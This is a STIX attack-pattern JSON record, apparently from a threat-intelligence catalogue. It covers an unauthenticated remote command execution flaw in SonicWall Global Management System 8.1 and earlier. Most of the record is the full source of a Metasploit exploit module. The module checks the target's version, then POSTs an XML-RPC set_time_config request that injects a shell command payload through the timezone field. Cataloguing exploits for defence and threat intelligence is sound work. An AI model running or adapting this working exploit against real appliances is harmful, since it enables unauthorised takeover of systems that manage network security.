{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9da0c13a-4f71-4471-9145-d3861b515428",
    "created": "2024-08-14T17:14:14.032338Z",
    "modified": "2024-08-14T17:14:14.032343Z",
    "name": "\"SonicWall Global Management System XMLRPC set_time_zone Unauth RCE\"",
    "description": " This module exploits a vulnerability in SonicWall Global Management System Virtual Appliance versions 8.1 (Build 8110.1197) and below. This virtual appliance can be downloaded from http://www.sonicwall.com/products/sonicwall-gms/ and is used 'in a holistic way to manage your entire network security environment.'  These vulnerable versions (8.1 Build 8110.1197 and below) do not prevent unauthenticated, external entities from making XML-RPC requests to port 21009 of the virtual app. After the XML-RPC call is made, a shell script is called like so: 'timeSetup.sh --tz=\"`command injection here`\"' --usentp=\"blah\"'.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/sonicwall/sonicwall_xmlrpc_rce.rb",
            "external_id": "sonicwall_xmlrpc_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.digitaldefense.com/digital-defense/vrt-discoveries/"
        },
        {
            "source_name": "reference",
            "url": "https://slides.com/kernelsmith/bsidesaustin2018/#/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => \"SonicWall Global Management System XMLRPC set_time_zone Unauth RCE\",\n      'Description' => %q{\n        This module exploits a vulnerability in SonicWall Global\n        Management System Virtual Appliance versions 8.1 (Build 8110.1197)\n        and below. This virtual appliance can be downloaded from\n        http://www.sonicwall.com/products/sonicwall-gms/ and is used 'in a\n        holistic way to manage your entire network security environment.'\n\n        These vulnerable versions (8.1 Build 8110.1197 and below) do not\n        prevent unauthenticated, external entities from making XML-RPC\n        requests to port 21009 of the virtual app. After the XML-RPC call\n        is made, a shell script is called like so:\n        'timeSetup.sh --tz=\"`command injection here`\"' --usentp=\"blah\"'.\n      },\n      'License' => MSF_LICENSE,\n      'Author' => [ 'Michael Flanders', #MSF Module\n                    'kernelsmith' #Advisor\n                  ],\n      'References' => [\n        ['URL', 'https://www.digitaldefense.com/digital-defense/vrt-discoveries/'],\n        ['URL', 'https://slides.com/kernelsmith/bsidesaustin2018/#/']\n      ],\n      'Platform' => [ 'unix' ],\n      'Arch' => ARCH_CMD,\n      'Targets' => [\n        [ 'SonicWall Global Management System Virtual Appliance', {} ],\n      ],\n      'Payload' => {\n        # Can't use ampersand, Java's XML-RPC parser will complain and return an error\n        'BadChars' => \"\\x26\",\n         'Compat' => {\n           'PayloadType' => 'cmd',\n           'RequiredCmd' => 'generic bash telnet'\n         }\n      },\n      'DisclosureDate' => '2016-07-22',\n      'DefaultTarget' => 0))\n\n      register_options(\n        [\n          OptString.new('WEB_SERVER_PORT', [ false, 'Port of web console login page.\n                                             Defaults to 80/443 depending on SSL.'])\n        ])\n  end\n\n  def check\n    if datastore['WEB_SERVER_PORT']\n      port_number = datastore['WEB_SERVER_PORT']\n    else\n      port_number = datastore['SSL'] ? '443' : '80'\n    end\n\n    handler = datastore['SSL'] ? 'https' : 'http'\n\n    res = request_url(\"#{handler}://#{rhost}:#{port_number}\")\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200 && res.body =~ /<TITLE>.+v(\\d\\.\\d)/\n      return CheckCode::Safe\n    end\n\n    version = Rex::Version.new $1.to_s\n\n    unless version <= Rex::Version.new('8.1')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    unless check == CheckCode::Appears\n      fail_with Failure::NotVulnerable, \"The target is not vulnerable.\"\n    end\n\n    print_status \"The target appears to be vulnerable, continuing exploit...\"\n    send_xml\n  end\n\n  def send_xml\n    xml_body = <<~HERESTRING\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <methodCall>\n      <methodName>set_time_config</methodName>\n      <params>\n        <param>\n          <value>\n            <struct>\n              <member>\n                <name>timezone</name>\n                <value>\n                  <string>\"`#{payload.encoded}`\"</string>\n                </value>\n              </member>\n            </struct>\n          </value>\n        </param>\n      </params>\n    </methodCall>\n    HERESTRING\n\n    res = send_request_raw({\n      'method'  => 'POST',\n      'uri'     => '/',\n      'data'    => xml_body,\n      'ctype'   => 'text/xml; charset=UTF-8'\n    })\n\n    unless res && res.body.include?(\"success\")\n      print_error(\"Error sending XML to #{rhost}:#{rport}\")\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-07-22",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}